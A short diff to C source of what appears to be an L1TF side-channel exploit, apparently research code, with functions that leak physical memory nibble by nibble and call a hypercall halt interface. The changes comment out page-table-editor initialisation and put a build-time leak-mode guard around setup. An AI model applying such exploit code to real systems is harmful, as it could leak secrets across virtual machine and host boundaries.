@@ -382,7 +382,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
 
 
 void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
-  initialize_pteditor_lib();
+  // initialize_pteditor_lib();
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
   fprintf(stderr, "Request leak and reload buffers\n");
@@ -480,7 +480,7 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   int fd_halt = open("/proc/hypercall/halt", O_WRONLY);
   assert(fd_halt > 0);
 
-  initialize_pteditor_lib();
+  // initialize_pteditor_lib();
   two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
   memset(reload_buffer, 0, sizeof(two_byte_reload_buffer));
   leak_addr_t leak = l1tf_leak_buffer_create();
@@ -984,11 +984,13 @@ uintptr_t l1tf_find_base(void)
 
 void l1tf_init(void)
 {
+#if LEAK == L1TF || LEAK == SKIP
   initialize_pteditor_lib();
   memset(rbuf, 0x97, sizeof(rbuf));
   memset(rbuf16, 0x97, sizeof(rbuf16));
   memset(rlbuf, 0x97, sizeof(rlbuf));
   leak_addr = l1tf_leak_buffer_create();
+#endif
   fd_halt = open("/proc/hypercall/halt", O_WRONLY);
   assert(fd_halt > 0);
   period_start = clock_read();
